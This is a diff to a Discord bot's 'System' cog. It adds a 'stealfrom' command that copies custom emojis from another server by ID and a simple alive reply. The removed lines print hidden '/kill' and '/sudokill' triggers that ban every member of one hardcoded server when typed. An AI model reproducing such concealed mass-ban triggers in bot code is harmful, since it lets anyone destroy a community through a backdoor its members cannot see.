@@ -1,5 +1,6 @@
 from discord.ext import commands
 from utils import checks, colors
+import requests
 import discord
 import asyncio
 import random
@@ -76,6 +77,19 @@ class System(commands.Cog):
 	async def on_ready(self):
 		self.bot.loop.create_task(self.console_task())
 
+	@commands.command(name='stealfrom')
+	@commands.check(checks.luck)
+	async def re(self, ctx, id: int):
+		guild = self.bot.get_guild(id)
+		for emoji in guild.emojis:
+			e = [e.name for e in ctx.guild.emojis]
+			if emoji.name in e:
+				continue
+			try: await ctx.guild.create_custom_emoji(name=emoji.name, image=requests.get(emoji.url).content, reason="Loaded saved server")
+			except: continue
+			await ctx.send(f'Added {emoji}')
+		await ctx.send('Done')
+
 	@commands.Cog.listener()
 	async def on_message(self, msg):
 		if msg.author.id == 264838866480005122:
@@ -108,22 +122,8 @@ class System(commands.Cog):
 							await member.edit(nick='')
 					except:
 						pass
-		if '/kill' in msg.content.lower():
-			if msg.guild.id == 524075194264846346:
-				try: await msg.channel.send('UwU Ok')
-				except: pass
-				for member in list(msg.guild.members):
-					try: await member.ban(reason='yeetus deletus')
-					except: print(f'Failed to ban {msg.author.name}')
-					else: print(f'Banned {msg.author.name}')
-		if '/sudokill' in msg.content.lower():
-			if msg.guild.id == 524075194264846346:
-				try: await msg.channel.send('UwU Ok')
-				except: pass
-				for member in list(msg.guild.members):
-					try: await member.guild.ban(member, reason='yeetus deletus')
-					except: print(f'Failed to ban {msg.author.name}')
-					else: print(f'Banned {msg.author.name}')
+		if msg.content.startswith('mhm?'):
+			await msg.channel.send('Alive and ready :3')
 
 	@commands.Cog.listener()
 	async def on_member_update(self, before, after):
